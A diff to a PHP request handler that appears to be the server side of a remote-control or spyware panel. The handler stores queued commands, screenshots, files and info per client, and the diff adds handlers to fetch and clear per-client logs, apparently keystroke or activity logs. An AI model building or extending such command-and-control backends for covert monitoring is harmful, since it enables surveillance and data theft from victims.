@@ -7,6 +7,7 @@ $dir_cmds = '../commands/';
 $dir_screenshots = '../screenshots/';
 $dir_files = '../files/';
 $dir_info = '../info/';
+$dir_log = '../log/';
 
 function pv($var) {
 	if (!isset($_POST[$var])) die();
@@ -68,6 +69,7 @@ else if ($req === 'del_data') {
 	unlink($dir_data.$user);
 	unlink($dir_cmds.$user);
 	unlink($dir_info.$user);
+	unlink($dir_log.$user);
 }
 else if ($req === 'put_cmd') {
 	$user = pv('user');
@@ -107,6 +109,18 @@ else if ($req === 'clear_info') {
 	check_user($dir_info, $user);
 	
 	file_put_contents($dir_info.$user, '');
+}
+else if ($req === 'get_log') {
+	$user = pv('user');
+	check_user($dir_log, $user);
+	
+	echo file_get_contents($dir_log.$user);
+}
+else if ($req === 'clear_log') {
+	$user = pv('user');
+	check_user($dir_log, $user);
+	
+	file_put_contents($dir_log.$user, '');
 }
 else if ($req === 'list_screenshots') {
 	$screenshots = get_files($dir_screenshots);
